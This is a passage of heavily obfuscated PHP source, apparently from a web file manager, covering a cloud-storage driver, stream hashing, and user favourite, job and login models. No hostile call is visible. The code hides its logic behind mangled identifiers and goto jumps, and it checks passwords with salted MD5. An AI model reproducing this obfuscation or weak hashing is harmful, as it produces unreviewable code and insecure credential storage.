$dŒ’Ÿæ¢É…[209] => $dŒ’Ÿæ¢É…[118], $dŒ’Ÿæ¢É…[1216] => strlen($dÔ»ŠÉ¦„æ)); $CŒç¹ùõÏ = $dŒ’Ÿæ¢É…[222]; $cæŞîšùì = $dŒ’Ÿæ¢É…[8] . $this->pathEncode($aèõÒ‚œ¶‚) . $eÃĞ¬Â¡¹¯[$dŒ’Ÿæ¢É…[167]]; goto eæ¸ƒö‡×’; eæ¸ƒö‡×’: $bãÃ¬‚ŠäÈ = $this->client->__getSignatureV4($E’¨ù®Ã¾, $B—‹Ñ¡ÈÛÈ, $CŒç¹ùõÏ, $cæŞîšùì, $dÔ»ŠÉ¦„æ); return array($dŒ’Ÿæ¢É…[230] => $bãÃ¬‚ŠäÈ[$dŒ’Ÿæ¢É…[230]], $dŒ’Ÿæ¢É…[220] => $bãÃ¬‚ŠäÈ[$dŒ’Ÿæ¢É…[1305]], $dŒ’Ÿæ¢É…[232] => $Fä·œÄÒ, $dŒ’Ÿæ¢É…[1302] => $bãÃ¬‚ŠäÈ[$dŒ’Ÿæ¢É…[1302]]); goto D‚²ãÜ¶óÑ; D‚²ãÜ¶óÑ: } public function link($dŞíåø©Ç¼, $aƒ§ö‹Àˆè = array()) { return parent::link($dŞíåø©Ç¼, $aƒ§ö‹Àˆè); } public function fileOut($dĞÛ™»é‹ , $AØÇ‘£øØ = false, $b–™—¹í‘Ï = false, $eÓãØº»‡ö = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÉóçÄÇ][1310])) { return parent::fileOutServer($dĞÛ™»é‹ , $AØÇ‘£øØ, $b–™—¹í‘Ï, $eÓãØº»‡ö); } parent::fileOut($dĞÛ™»é‹ , $AØÇ‘£øØ, $b–™—¹í‘Ï, $eÓãØº»‡ö); } public function fileOutImage($dÛƒ¹¥Ë™ª, $dêÍ‡õÍ  = 250) { if (strstr($this->endpoint, $_SERVER[ÉóçÄÇ][1310])) { return parent::fileOutImageServer($dÛƒ¹¥Ë™ª, $dêÍ‡õÍ ); } parent::fileOutImage($dÛƒ¹¥Ë™ª, $dêÍ‡õÍ ); } public function fileOutLink($a¼æÜ ÁŞ) { $D÷ºùÜ·Øß =& $_SERVER[ÉóçÄÇ]; if (substr($a¼æÜ ÁŞ, 0, 7) == $D÷ºùÜ·Øß[1184]) { $a¼æÜ ÁŞ = $D÷ºùÜ·Øß[1185] . substr($a¼æÜ ÁŞ, 7); } header($D÷ºùÜ·Øß[158] . $a¼æÜ ÁŞ); die; } public function getHost() { $fÄ“µ£½´Ÿ =& $_SERVER[ÉóçÄÇ]; $d›ì´÷Èö = str_rtrim(parent::getHost(), $fÄ“µ£½´Ÿ[8] . $this->bucket); $d›ì´÷Èö = explode($fÄ“µ£½´Ÿ[177], $d›ì´÷Èö); return $d›ì´÷Èö[0] . $fÄ“µ£½´Ÿ[177] . $this->bucket . $fÄ“µ£½´Ÿ[94] . $d›ì´÷Èö[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($bĞŸÅ²ìÖ­, $D×ƒ¸œ¤Œï = 0) { parent::__construct(); $this->source = $bĞŸÅ²ìÖ­; $this->sourceSize = $D×ƒ¸œ¤Œï; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($AèòâÅ‘´È = false) { return $this->sourceSize; } public function getContent($c…¦ñ»øğ‰ = false) { return $this->fileSubstr($c…¦ñ»øğ‰, 0, $this->sourceSize); } public function fileSubstr($b°×™â™Îê = false, $Bß³á±‡ì = 0, $e×­Ş±ò‚ = 0) { if (!$e×­Ş±ò‚) { $e×­Ş±ò‚ = $this->sourceSize; } $fËˆÚ¾æ = $this->sourceSize - $Bß³á±‡ì; if ($e×­Ş±ò‚ >= $fËˆÚ¾æ) { $e×­Ş±ò‚ = $fËˆÚ¾æ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Bß³á±‡ì, $e×­Ş±ò‚); } if ($this->sourceType == self::TYPE_FILE) { if ($e×­Ş±ò‚ <= 0) { return $_SERVER[ÉóçÄÇ][33]; } $a§ù÷ëò’¡ = ftell($this->source); fseek_64($this->source, $a§ù÷ëò’¡ + $Bß³á±‡ì); $eÙâ–á‰²± = @fread($this->source, $e×­Ş±ò‚); fseek_64($this->source, $a§ù÷ëò’¡); return $eÙâ–á‰²±; } } public function hashMd5($dï‰¸É¡ŸÂ = false) { return md5($this->getContent()); } public static function hash($Eœ×¢¸Ú÷¸, $eÆäªƒ·Öñ = 0) { $AÖ÷¢ñõ = new PathDriverStream($Eœ×¢¸Ú÷¸, $eÆäªƒ·Öñ); return $AÖ÷¢ñõ->hashSimple($Eœ×¢¸Ú÷¸); } public static function md5($AğÜÊ±À–®, $A…®‘ º©ë = 0) { $B“â™æ§œÉ = new PathDriverStream($AğÜÊ±À–®, $A…®‘ º©ë); return $B“â™æ§œÉ->hashMd5($AğÜÊ±À–®); } } goto AíªËñ½¬æ; E°‡¾í´£: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($dÌ•Û­ÍÃ) { $A‡º«á– =& $_SERVER[ÉóçÄÇ]; return array($A‡º«á–[1777] => array(USER_ID, $A‡º«á–[2090])); } protected function listData() { $BˆïÃÌà¥‘ =& $_SERVER[ÉóçÄÇ]; $d¥É¬ÓÊ‘’ = array($BˆïÃÌà¥‘[1503] => USER_ID, $BˆïÃÌà¥‘[457] => 0); $F×˜©ª¨×Ö = $BˆïÃÌà¥‘[2091]; $d…œĞØœĞŒ = $this->field($F×˜©ª¨×Ö)->where($d¥É¬ÓÊ‘’)->order($BˆïÃÌà¥‘[2092])->select(); return $d…œĞØœĞŒ ? $d…œĞØœĞŒ : array(); } protected function resetCache() { } protected function listView() { goto bÕÁ¬î…¸Î; Aš„Ñ‹øã­: $aÑ³Ñ°Ÿš = array_to_keyvalue($DÌÍèÓ§·é, $eÆËñÙß‰Ä[33], $eÆËñÙß‰Ä[75]); if (!$aÑ³Ñ°Ÿš) { return $d¦Çï§´Úí; } $Bğ‹ò‚¨êÁ = 2000; goto d†¡ŠêŠó; d†¡ŠêŠó: $fŒÓ ö–Ù£ = array($eÆËñÙß‰Ä[404] => array($eÆËñÙß‰Ä[405], $aÑ³Ñ°Ÿš)); $aÈô¹ƒŸ¨ï = Model($eÆËñÙß‰Ä[776])->listSource($fŒÓ ö–Ù£, $Bğ‹ò‚¨êÁ); $aÈô¹ƒŸ¨ï = array_merge($aÈô¹ƒŸ¨ï[$eÆËñÙß‰Ä[73]], $aÈô¹ƒŸ¨ï[$eÆËñÙß‰Ä[74]]); goto AÕŞÙõ½Š–; AÕŞÙõ½Š–: $aÈô¹ƒŸ¨ï = array_to_keyvalue($aÈô¹ƒŸ¨ï, $eÆËñÙß‰Ä[390]); foreach ($d¦Çï§´Úí as $Fã‰º½ÓæÔ => $fæ‚ÒØòöÊ) { $EŠ¦Ÿ’Š´á = $aÈô¹ƒŸ¨ï[$fæ‚ÒØòöÊ[$eÆËñÙß‰Ä[75]]]; $EŠ¦Ÿ’Š´á = $EŠ¦Ÿ’Š´á ? $EŠ¦Ÿ’Š´á : array(); $d¦Çï§´Úí[$Fã‰º½ÓæÔ] = array_merge($EŠ¦Ÿ’Š´á, $fæ‚ÒØòöÊ); } return $d¦Çï§´Úí; goto DØ²Ë¯¥½Í; bÕÁ¬î…¸Î: $eÆËñÙß‰Ä =& $_SERVER[ÉóçÄÇ]; $d¦Çï§´Úí = $this->listData(); $DÌÍèÓ§·é = array_filter_by_field($d¦Çï§´Úí, $eÆËñÙß‰Ä[29], $eÆËñÙß‰Ä[403]); goto Aš„Ñ‹øã­; DØ²Ë¯¥½Í: } protected function addFav($C¹±ÜŸÒ¡š, $a„ÖØ‚‘Í‹ = '', $dåò˜…¶‘± = "\163\x6f\x75\x72\x63\145") { goto aÕ‡…ˆ°¨Ş; E—œº”¯ÛÀ: $c£˜ÃÑ¬œÓ = array($då œÎªç[1503] => USER_ID, $då œÎªç[457] => 0); $D‹ÔÙò¥Ìë = $this->where($c£˜ÃÑ¬œÓ)->max($då œÎªç[1697]); if (!$D‹ÔÙò¥Ìë) { $D‹ÔÙò¥Ìë = 0; } goto bÊ§ªÃŠ¼İ; A–ŸÖ¦º¾: return $this->add($FİÚ”¸–Êˆ); goto eœ¼º³›áè; aÕ‡…ˆ°¨Ş: $då œÎªç =& $_SERVER[ÉóçÄÇ]; $c£˜ÃÑ¬œÓ = array($då œÎªç[1503] => USER_ID, $då œÎªç[457] => 0, $då œÎªç[409] => $dåò˜…¶‘±, $då œÎªç[408] => $C¹±ÜŸÒ¡š); if ($this->where($c£˜ÃÑ¬œÓ)->find()) { return !1; } goto E—œº”¯ÛÀ; bÊ§ªÃŠ¼İ: if (!$a„ÖØ‚‘Í‹ && $dåò˜…¶‘± == $då œÎªç[403]) { $D£ÓÉ‰Ù” = Model($då œÎªç[1186])->where(array($då œÎªç[404] => $C¹±ÜŸÒ¡š))->find(); if (!$D£ÓÉ‰Ù”) { return !1; } $a„ÖØ‚‘Í‹ = $D£ÓÉ‰Ù”[$då œÎªç[28]]; } $a„ÖØ‚‘Í‹ = $this->getAutoName($a„ÖØ‚‘Í‹); $FİÚ”¸–Êˆ = array($då œÎªç[1503] => USER_ID, $då œÎªç[457] => 0, $då œÎªç[407] => $a„ÖØ‚‘Í‹, $då œÎªç[408] => $C¹±ÜŸÒ¡š, $då œÎªç[409] => $dåò˜…¶‘±, $då œÎªç[1678] => $D‹ÔÙò¥Ìë + 1); goto A–ŸÖ¦º¾; eœ¼º³›áè: } protected function remove($FÛÕ¡ƒÁÉÏ) { $A¾¨°Ì ÙÓ =& $_SERVER[ÉóçÄÇ]; $a¢îˆ¹ãµ’ = array($A¾¨°Ì ÙÓ[1503] => USER_ID, $A¾¨°Ì ÙÓ[406] => $FÛÕ¡ƒÁÉÏ); return $this->where($a¢îˆ¹ãµ’)->delete(); } protected function removeByName($fã·²´­àª) { $f«›ãåŸ«ò =& $_SERVER[ÉóçÄÇ]; $d÷Ã”—êÉ = array($f«›ãåŸ«ò[1503] => USER_ID, $f«›ãåŸ«ò[407] => $fã·²´­àª, $f«›ãåŸ«ò[457] => 0); return $this->where($d÷Ã”—êÉ)->delete(); } protected function rename($fáº¹Ô–ô, $AèÏˆÌ‡½ƒ) { $C·­òã°Ñƒ =& $_SERVER[ÉóçÄÇ]; if ($fáº¹Ô–ô == $AèÏˆÌ‡½ƒ) { return !1; } $FÄÆöÇãÒ† = $this->getAutoName($AèÏˆÌ‡½ƒ); if ($AèÏˆÌ‡½ƒ != $FÄÆöÇãÒ†) { return !1; } $Aò¥…å¬à„ = array($C·­òã°Ñƒ[1503] => USER_ID, $C·­òã°Ñƒ[457] => 0, $C·­òã°Ñƒ[28] => $fáº¹Ô–ô); return $this->where($Aò¥…å¬à„)->save(array($C·­òã°Ñƒ[28] => $AèÏˆÌ‡½ƒ)); } protected function resetSort($CÀİ§…µ«) { $dÇ¸¼­‹·ô =& $_SERVER[ÉóçÄÇ]; $CÀİ§…µ« = is_array($CÀİ§…µ«) ? $CÀİ§…µ« : array(); $a»ãÉæáÂ = array($dÇ¸¼­‹·ô[1503] => USER_ID); for ($CÍÖİÂ„‹© = 0; $CÍÖİÂ„‹© < count($CÀİ§…µ«); $CÍÖİÂ„‹©++) { $a»ãÉæáÂ[$dÇ¸¼­‹·ô[406]] = $CÀİ§…µ«[$CÍÖİÂ„‹©]; $this->where($a»ãÉæáÂ)->save(array($dÇ¸¼­‹·ô[1678] => $CÍÖİÂ„‹© + 1)); } return !0; } protected function moveTop($bò»ÅÍÄŠ¯) { goto fà¿”ìë„£; EšÍ£Ë™åÇ: return $this->resetSort($Fø³©”Æ³); goto F™çšíâ©; fà¿”ìë„£: $dŞµòã¬µ =& $_SERVER[ÉóçÄÇ]; $aÕÒ¾ŸÆŞ˜ = array($dŞµòã¬µ[1503] => USER_ID, $dŞµòã¬µ[457] => 0); $cÜç•‹èôõ = $this->where($aÕÒ¾ŸÆŞ˜)->where(array($dŞµòã¬µ[28] => $bò»ÅÍÄŠ¯))->find(); goto Eèù¡½Ğ¤ñ; Eèù¡½Ğ¤ñ: if (!$cÜç•‹èôõ) { return; } $Fø³©”Æ³ = $this->field($dŞµòã¬µ[388])->where($aÕÒ¾ŸÆŞ˜)->order($dŞµòã¬µ[2092])->select(); $Fø³©”Æ³ = array_to_keyvalue($Fø³©”Æ³, $dŞµòã¬µ[33], $dŞµòã¬µ[388]); goto cíŠ»°·¬‘; cíŠ»°·¬‘: $dÆƒŠÅŞ‰ = $Fø³©”Æ³; $Fø³©”Æ³ = array_remove_value($Fø³©”Æ³, $cÜç•‹èôõ[$dŞµòã¬µ[388]]); array_unshift($Fø³©”Æ³, $cÜç•‹èôõ[$dŞµòã¬µ[388]]); goto EšÍ£Ë™åÇ; F™çšíâ©: } protected function moveBottom($dÏ‡Ó´˜ğ­) { $f ¼÷¸×ß =& $_SERVER[ÉóçÄÇ]; $bñ‹˜ŞºŸ­ = array($f ¼÷¸×ß[1503] => USER_ID, $f ¼÷¸×ß[457] => 0); $aŸÈƒ“°³Â = $this->where($bñ‹˜ŞºŸ­)->max($f ¼÷¸×ß[1697]); $f™äø†Ø‰ì = array($f ¼÷¸×ß[1697] => $aŸÈƒ“°³Â + 1); return $this->where($bñ‹˜ŞºŸ­)->where(array($f ¼÷¸×ß[28] => $dÏ‡Ó´˜ğ­))->save($f™äø†Ø‰ì); } private function getAutoName($e’àÀ¢Áæ) { goto A—‡±õöè; aÌŸ‡¾ø“: $cÛäÀå“è = array_to_keyvalue($cÛäÀå“è, $a®ÁÕ¸Á¥[33], $a®ÁÕ¸Á¥[28]); if (!$cÛäÀå“è || !in_array($e’àÀ¢Áæ, $cÛäÀå“è)) { return $e’àÀ¢Áæ; } for ($bÑò“ªÑ¹ = 0; $bÑò“ªÑ¹ < count($cÛäÀå“è); $bÑò“ªÑ¹++) { if (!in_array($e’àÀ¢Áæ . "\x28{$bÑò“ªÑ¹}\51", $cÛäÀå“è)) { return $e’àÀ¢Áæ . "\x28{$bÑò“ªÑ¹}\x29"; } } goto dŞ¼Ş™—–; A—‡±õöè: $a®ÁÕ¸Á¥ =& $_SERVER[ÉóçÄÇ]; $AØÌ© •ë = array($a®ÁÕ¸Á¥[1503] => USER_ID, $a®ÁÕ¸Á¥[457] => 0); $cÛäÀå“è = $this->field($a®ÁÕ¸Á¥[28])->where($AØÌ© •ë)->select(); goto aÌŸ‡¾ø“; dŞ¼Ş™—–: return $e’àÀ¢Áæ . "\x28{$bÑò“ªÑ¹}\51"; goto eîï‹Çã³; eîï‹Çã³: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\152\157\142\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x64\x65\163\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\x6c\x66\112\157\142\114\x69\163\x74"; public function listData($dÏ„…ï±…š = false, $F§Œ›Á–“£ = "\163\x6f\x72\x74", $däÒ„Àµ¼  = false) { return parent::listData($dÏ„…ï±…š, $F§Œ›Á–“£, $däÒ„Àµ¼ ); } public function remove($fÓ–×Ç±ˆ¡) { return parent::remove($fÓ–×Ç±ˆ¡); } public function add($aê©ó†¾È§) { $dµ ÉŞå÷ =& $_SERVER[ÉóçÄÇ]; if ($this->findByName($aê©ó†¾È§[$dµ ÉŞå÷[28]])) { return !1; } $aê©ó†¾È§[$dµ ÉŞå÷[1697]] = $this->getSort(); return parent::insert($aê©ó†¾È§); } private function getSort() { $BÑÚç»ÕÉ =& $_SERVER[ÉóçÄÇ]; $eè¢Óƒ­Í’ = parent::listData(); $a°–Çİ‘Â = array_to_keyvalue($eè¢Óƒ­Í’, $BÑÚç»ÕÉ[33], $BÑÚç»ÕÉ[1697]); return empty($a°–Çİ‘Â) ? 0 : max($a°–Çİ‘Â) + 1; } public function update($b·àòÙãñ¡, $F¾–ĞŒ„‰Ã) { $d®³¼®§” =& $_SERVER[ÉóçÄÇ]; $A±’’Ş³Ğù = parent::listData($b·àòÙãñ¡); $C£¦†ƒÊ‘ = $this->findByName($F¾–ĞŒ„‰Ã[$d®³¼®§”[28]]); if (!$A±’’Ş³Ğù || $C£¦†ƒÊ‘ && $C£¦†ƒÊ‘[$d®³¼®§”[388]] != $A±’’Ş³Ğù[$d®³¼®§”[388]]) { return !1; } return parent::update($b·àòÙãñ¡, $F¾–ĞŒ„‰Ã); } public function setUserJob($eÇèÇµøÀ, $F•±ô–ˆ¦é) { goto F†•¼˜®ñï; aè†Õµ£ÖÇ: $B ìììªÁ = rtrim($B ìììªÁ, $CÍÄ“àô´…[47]); Model($CÍÄ“àô´…[501])->metaSet($eÇèÇµøÀ, self::JOB_KEY, $B ìììªÁ); goto bò¾•¯‡×; F†•¼˜®ñï: $CÍÄ“àô´… =& $_SERVER[ÉóçÄÇ]; if (!is_array($F•±ô–ˆ¦é)) { $F•±ô–ˆ¦é = array($F•±ô–ˆ¦é); } $eºíÎ˜ä¿— = parent::listData(); goto e¸“£ªÊ†Ï; e¸“£ªÊ†Ï: $e·—“¸õ»³ = array_to_keyvalue($eºíÎ˜ä¿—, $CÍÄ“àô´…[28]); $B ìììªÁ = $CÍÄ“àô´…[373]; foreach ($F•±ô–ˆ¦é as $dïÌ×„Ñİæ) { if ($e·—“¸õ»³[$dïÌ×„Ñİæ]) { $B ìììªÁ .= $e·—“¸õ»³[$dïÌ×„Ñİæ][$CÍÄ“àô´…[388]] . $CÍÄ“àô´…[47]; } else { $C¿‹Şíğ = $this->add($dïÌ×„Ñİæ); $B ìììªÁ .= $C¿‹Şíğ . $CÍÄ“àô´…[47]; } } goto aè†Õµ£ÖÇ; bò¾•¯‡×: } public function getUserJob($aÉöÙåƒ’¥) { $EÜÙåÍŠù¬ = Model($_SERVER[ÉóçÄÇ][501])->metaGet($aÉöÙåƒ’¥); return $this->getUserJobInfo($EÜÙåÍŠù¬[self::JOB_KEY]); } public function getUserJobInfo($A¶È¯´Œ±Ÿ) { goto C«ºÔ±Ÿùí; C«ºÔ±Ÿùí: $DÒß †À =& $_SERVER[ÉóçÄÇ]; $DËÓ¯Š»óÍ = explode($DÒß †À[47], $A¶È¯´Œ±Ÿ); $C¹ê½”íª£ = parent::listData(); goto Cƒ‚Ü¾Ìçß; Cƒ‚Ü¾Ìçß: $C¹ê½”íª£ = array_remove_key($C¹ê½”íª£, $DÒß †À[192]); $cƒ²Æ‡ƒ•æ = array(); foreach ($DËÓ¯Š»óÍ as $fÈÙôÊÉ¶¼) { if (isset($C¹ê½”íª£[$fÈÙôÊÉ¶¼])) { $cƒ²Æ‡ƒ•æ[] = $C¹ê½”íª£[$fÈÙôÊÉ¶¼]; } } goto a†¦“”Ú¥Õ; a†¦“”Ú¥Õ: return $cƒ²Æ‡ƒ•æ; goto eŠ³Â‚¾Ô´; eŠ³Â‚¾Ô´: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\145" => "\165\x73\145\x72\x5f\155\145\164\141", "\155\145\x74\x61\106\x69\145\x6c\144" => "\x75\163\145\162\x49\104"); protected $simpleField = "\165\163\x65\162\111\x44\x2c\x6e\151\x63\x6b\116\141\155\x65\x2c\156\141\155\145\x2c\141\x76\141\x74\x61\x72\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($D¾õÌÙí³) { $F¢Ìˆí¬«Š =& $_SERVER[ÉóçÄÇ]; $bİİ¥‘ˆ‡¥ = $F¢Ìˆí¬«Š[2093]; return array($F¢Ìˆí¬«Š[1745] => array($D¾õÌÙí³[0], $bİİ¥‘ˆ‡¥), $F¢Ìˆí¬«Š[1747] => array($D¾õÌÙí³[0], $bİİ¥‘ˆ‡¥), $F¢Ìˆí¬«Š[2094] => array($D¾õÌÙí³[0], $bİİ¥‘ˆ‡¥)); } protected function getInfo($b¸¹à±Ëƒà, $d—ô°øÃ¬ = false) { $aí„ƒÇ¹–è = $this->getInfoSimple($b¸¹à±Ëƒà); if (!is_array($aí„ƒÇ¹–è)) { return array(); } if ($d—ô°øÃ¬) { return $this->_getInfoApply($aí„ƒÇ¹–è); } return $this->cacheFunctionGet($_SERVER[ÉóçÄÇ][1754], $b¸¹à±Ëƒà); } protected function getInfoFull($b•œÜ°’¼Ÿ, $eŸ‡§áÏ° = false) { $Bƒ›˜æòğí = $this->getInfoSimple($b•œÜ°’¼Ÿ); if (!is_array($Bƒ›˜æòğí)) { return array(); } if ($eŸ‡§áÏ°) { return $this->_getInfoApply($Bƒ›˜æòğí, !0); return $this->_getInfoApply($Bƒ›˜æòğí, !0); } return $this->cacheFunctionGet($_SERVER[ÉóçÄÇ][2095], $b•œÜ°’¼Ÿ); } private function _getInfoApply($Cğïìø’˜ñ, $c’•Ñà£¹ = false) { goto F½îí‚§¿ç; F½îí‚§¿ç: $d¿¦ÎÃ½Á‰ =& $_SERVER[ÉóçÄÇ]; if (!$Cğïìø’˜ñ) { return $Cğïìø’˜ñ; } $eŸĞâÌ¤ = md5($d¿¦ÎÃ½Á‰[2096] . $Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[831]] . $d¿¦ÎÃ½Á‰[2097] . $Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[28]]); goto B¥ÍëîÑÄ; e­­Íç«: $Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[84]][$d¿¦ÎÃ½Á‰[1934]] = isset($eÅ›İèÚÇ·[$d¿¦ÎÃ½Á‰[1935]]) ? $eÅ›İèÚÇ·[$d¿¦ÎÃ½Á‰[1935]] : null; if ($c’•Ñà£¹) { $Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[439]] = $this->metaGet($Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[1511]]); } return $Cğïìø’˜ñ; goto dİÂ’†ù¢; B¥ÍëîÑÄ: $Cğïìø’˜ñ = $this->_listDataApplyItem($Cğïìø’˜ñ); $eÅ›İèÚÇ· = Model($d¿¦ÎÃ½Á‰[1186])->metaGet($Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[84]][$d¿¦ÎÃ½Á‰[390]]); $Cğïìø’˜ñ[$d¿¦ÎÃ½Á‰[2098]] = $eŸĞâÌ¤; goto e­­Íç«; dİÂ’†ù¢: } protected function getInfoSimple($F‰Í™½—, $cÍÒÓÙ¥‹ = false) { $E‘˜…×À¯ =& $_SERVER[ÉóçÄÇ]; if (!$F‰Í™½—) { return array(); } if ($cÍÒÓÙ¥‹) { $E¦ç¼˜ƒƒè = $this->where(array($E‘˜…×À¯[1511] => intval($F‰Í™½—)))->find(); if (!is_array($E¦ç¼˜ƒƒè)) { return array(); } $E¦ç¼˜ƒƒè[$E‘˜…×À¯[2099]] = Action($E‘˜…×À¯[2100])->parseUrl($E¦ç¼˜ƒƒè[$E‘˜…×À¯[2099]]); return $E¦ç¼˜ƒƒè; } return $this->cacheFunctionGet($E‘˜…×À¯[1748], $F‰Í™½—); } protected function getInfoSimpleOuter($BÈëä­àï) { goto C¯“¬ã¾µ¡; cŸí¦ç›ßç: $bïí•·ğøì = array_field_key($d‘½÷ª, explode($Fñƒ÷œÖİö[47], $this->simpleField)); if (!$bïí•·ğøì) { return array($Fñƒ÷œÖİö[1511] => $Fñƒ÷œÖİö[1067], $Fñƒ÷œÖİö[28] => $Fñƒ÷œÖİö[159] . LNG($Fñƒ÷œÖİö[2103]) . $Fñƒ÷œÖİö[499], $Fñƒ÷œÖİö[2099] => STATIC_PATH . $Fñƒ÷œÖİö[2104]); } $bïí•·ğøì[$Fñƒ÷œÖİö[2099]] = Action($Fñƒ÷œÖİö[2100])->parseUrl($bïí•·ğøì[$Fñƒ÷œÖİö[2099]]); goto d¥¢Ş†¾Î«; d¥¢Ş†¾Î«: return $bïí•·ğøì; goto BÔ¬‹×Ù‹; C¯“¬ã¾µ¡: $Fñƒ÷œÖİö =& $_SERVER[ÉóçÄÇ]; if (!$BÈëä­àï || $BÈëä­àï == 0) { return array($Fñƒ÷œÖİö[1511] => $Fñƒ÷œÖİö[491], $Fñƒ÷œÖİö[28] => $Fñƒ÷œÖİö[159] . LNG($Fñƒ÷œÖİö[2101]) . $Fñƒ÷œÖİö[499], $Fñƒ÷œÖİö[2099] => STATIC_PATH . $Fñƒ÷œÖİö[2102]); } $d‘½÷ª = $this->cacheFunctionGet($Fñƒ÷œÖİö[1748], $BÈëä­àï); goto cŸí¦ç›ßç; BÔ¬‹×Ù‹: } protected function groupUser($a­”ğ¿Ÿ¦ª) { } public static function errorLang($DÒÊº²ƒšæ) { $a…ô¤…ß£ =& $_SERVER[ÉóçÄÇ]; $EÆ³ìŠƒÑÛ = array(self::ERROR_USER_NOT_EXISTS => $a…ô¤…ß£[2105], self::ERROR_USER_PASSWORD_ERROR => $a…ô¤…ß£[2106], self::ERROR_USER_EXIST_NAME => $a…ô¤…ß£[2107], self::ERROR_USER_EXIST_PHONE => $a…ô¤…ß£[2108], self::ERROR_USER_EXIST_EMAIL => $a…ô¤…ß£[2109], self::ERROR_USER_LOGIN_LOCK => $a…ô¤…ß£[2110], self::ERROR_IP_NOT_ALLOW => $a…ô¤…ß£[2111], self::ERROR_USER_EXIST_NICKNAME => $a…ô¤…ß£[2112]); return LNG($EÆ³ìŠƒÑÛ[$DÒÊº²ƒšæ]); } public function getInfoByMeta($eõ·ò’Œ¦, $E…ˆ¶§¦À¿) { $dåË¯ÖÉº½ =& $_SERVER[ÉóçÄÇ]; $AŸØ‚©ÓÔÚ = Model($dåË¯ÖÉº½[2113])->where(array($dåË¯ÖÉº½[92] => $eõ·ò’Œ¦, $dåË¯ÖÉº½[370] => $E…ˆ¶§¦À¿))->find(); if ($AŸØ‚©ÓÔÚ) { return $this->getInfo($AŸØ‚©ÓÔÚ[$dåË¯ÖÉº½[1511]]); } return !1; } public function userLoginCheck($Eá â¾“Ä‡, $fïÍ„›°ÙÉ) { $CËÂÒµ¾òø =& $_SERVER[ÉóçÄÇ]; $c­ÒÁÙÀÉ¯ = $this->userLoginFind($Eá â¾“Ä‡); if (!$c­ÒÁÙÀÉ¯) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($c­ÒÁÙÀÉ¯[$CËÂÒµ¾òø[1511]], $fïÍ„›°ÙÉ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($c­ÒÁÙÀÉ¯[$CËÂÒµ¾òø[1511]]); } public function userLoginFind($dÆ³œ¢£óÆ) { $EÇ—œÙï =& $_SERVER[ÉóçÄÇ]; $Eö´ŸÜÀƒä = array($EÇ—œÙï[28] => $dÆ³œ¢£óÆ, $EÇ—œÙï[1938] => $dÆ³œ¢£óÆ, $EÇ—œÙï[301] => $dÆ³œ¢£óÆ, $EÇ—œÙï[2114] => $dÆ³œ¢£óÆ, $EÇ—œÙï[939] => $EÇ—œÙï[941]); if ($this->nickNameRpt()) { unset($Eö´ŸÜÀƒä[$EÇ—œÙï[1938]]); } return $this->where($Eö´ŸÜÀƒä)->find(); } public function clearCache($e‘è¥°ÃÛÒ) { $aäâ¥àÒÎ =& $_SERVER[ÉóçÄÇ]; $this->cacheFunctionClear($aäâ¥àÒÎ[1754], $e‘è¥°ÃÛÒ); $this->cacheFunctionClear($aäâ¥àÒÎ[1748], $e‘è¥°ÃÛÒ); $this->cacheFunctionClear($aäâ¥àÒÎ[2095], $e‘è¥°ÃÛÒ); } public function userPasswordCheck($Fªâêè…Õ, $Aå¦Ù½à) { $EÙï£Å ¤ =& $_SERVER[ÉóçÄÇ]; $aïø‰ğĞ¬§ = $this->where(array($EÙï£Å ¤[1511] => intval($Fªâêè…Õ)))->find(); $C¿‚¦áß‡ê = $this->metaGet($Fªâêè…Õ); $F„£…¼ˆ‘ß = isset($C¿‚¦áß‡ê[$EÙï£Å ¤[2115]]) ? $C¿‚¦áß‡ê[$EÙï£Å ¤[2115]] : $EÙï£Å ¤[33]; if (md5($F„£…¼ˆ‘ß . trim($Aå¦Ù½à)) !== $aïø‰ğĞ¬§[$EÙï£Å ¤[831]]) { return !1; } return !0; } public function userAdd($BâØ‰’²É) { goto BŒµÉÏ¯ß¼; CÂ£¢îøÔ§: $bÁ´Ô˜ã’´ = $this->_checkExist($BâØ‰’²É); if ($bÁ´Ô˜ã’´ !== !0) { return $bÁ´Ô˜ã’´; } $fÌÓ•Ó£‰ = $this->add($Eë±àôˆ£â); goto c®°’¬ÓŸ²; e½¼ŒÏ›À¥: return $fÌÓ•Ó£‰; goto B¼™–ĞÉâÜ; BŒµÉÏ¯ß¼: $féƒ‘Óèä¡ =& $_SERVER[ÉóçÄÇ]; $Eë±àôˆ£â = array($féƒ‘Óèä¡[407] => $BâØ‰’²É[$féƒ‘Óèä¡[28]], $féƒ‘Óèä¡[2116] => $BâØ‰’²É[$féƒ‘Óèä¡[1393]], $féƒ‘Óèä¡[2117] => isset($BâØ‰’²É[$féƒ‘Óèä¡[301]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[301]] : $féƒ‘Óèä¡[33], $féƒ‘Óèä¡[2118] => isset($BâØ‰’²É[$féƒ‘Óèä¡[2114]]) ? $BâØ‰’²É[$féƒ‘Óèä¡[2114]] 